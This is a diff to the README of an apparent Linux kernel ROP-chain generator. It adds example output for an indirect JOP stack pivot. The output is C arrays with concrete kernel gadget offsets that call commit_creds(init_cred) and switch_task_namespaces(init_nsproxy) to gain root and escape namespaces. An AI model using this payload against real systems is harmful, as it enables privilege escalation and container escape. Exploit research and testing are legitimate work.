@@ -17,7 +17,7 @@ PYTHONPATH=. python3 -m exkrop <vmlinux>
 - **Pivot gadget browser** — paginated selection of stack pivot gadgets (direct, offset, JOP chained, indirect) with detail view
 - **Reserved offset handling** — specify object offsets that must be preserved (e.g., vtable pointers); shift gadgets (`add rsp, N; ret`) are automatically inserted to skip over them
 - **JOP dispatch awareness** — JOP pivot dispatch entries are treated as occupied slots and automatically skipped
-- **Single C array output** — generates a ready-to-use `exploit_obj[]` array with `#define`s, per-line annotations, and pivot documentation
+- **C code generation** — for inline pivots, a single `exploit_obj[]` array; for indirect pivots, separate `exploit_obj[]` (dispatch + pointer) and `rop_chain[]` (at known address) arrays, all with `#define`s and per-line annotations
 
 ## Workflow
 
@@ -151,3 +151,61 @@ uint64_t exploit_obj[] = {
 ```
 
 The shift gadget at `+0x00` (`lea rsp, [rsp + 8] ; ret`) skips over the JOP dispatch pointer at `+0x08`, then the full ROP chain executes from `+0x10` onward.
+
+### Indirect JOP Pivot (chain at separate known address)
+
+For indirect pivots, the object only holds dispatch entries and a pointer to the ROP chain. The chain itself lives at a separate known address (e.g., a `pipe_buffer` page or mmap'd region).
+
+```
+=== Generated C code ===
+
+#include <stdint.h>
+
+#define KERN_BASE 0xffffffff81000000ULL
+#define KERN(off) (KERN_BASE + (off))
+
+// Privilege escalation: get root + escape namespaces
+
+/*
+ * Pivot type: jop_indirect
+ * Source register: rdi
+ * Step 1: KERN(0xe3f0d9) @ mov rax, qword ptr [rdi + 8] ; call rax
+ * Pivot: KERN(0x126ad44) @ push rax ; ... ; pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
+ * Dispatch: place KERN(0x126ad44) at [rdi+0x8]
+ * Place ROP chain address at [rdi+0x28]
+ */
+#define PIVOT_GADGET KERN(0xe3f0d9)
+#define OBJ_SIZE     0x100
+#define CHAIN_ADDR   0xDEADBEEFULL  // TODO: set to rop_chain address
+#define PTR_OFFSET   0x28
+#define DISPATCH_0_OFFSET 0x8
+
+uint64_t exploit_obj[] = {
+    0x0000000000000000ULL , // +0x00
+    KERN(0x126ad44)       , // +0x08 | dispatch[0] -> KERN(0x126ad44)
+    0x0000000000000000ULL , // +0x10
+    0x0000000000000000ULL , // +0x18
+    0x0000000000000000ULL , // +0x20
+    CHAIN_ADDR            , // +0x28 | pointer to chain -> CHAIN_ADDR
+};
+
+uint64_t rop_chain[] = {
+    KERN(0x177704)        , // pop rdi ; ret
+    KERN(0x30953a0)       , // init_cred
+    KERN(0x1e37d0)        , // commit_creds
+    KERN(0x5cd6ad)        , // mov edi, 1 ; mov eax, edi ; ret
+    KERN(0x1d6c00)        , // find_task_by_vpid
+    KERN(0x143485a)       , // push rax ; add eax, ebp ; pop rdi ; ret
+    KERN(0x15fbce)        , // pop rsi ; ret
+    KERN(0x3094e80)       , // init_nsproxy
+    KERN(0x1e16d0)        , // switch_task_namespaces
+    KERN(0x177704)        , // pop rdi ; ret
+    0x0000000000000000ULL ,
+    KERN(0x1a6440)        , // __x64_sys_fork
+    KERN(0x177704)        , // pop rdi ; ret
+    0x000000003b9aca00ULL ,
+    KERN(0x2732f0)        , // msleep
+};
+```
+
+Set `CHAIN_ADDR` to the runtime address where `rop_chain` is placed in kernel memory.
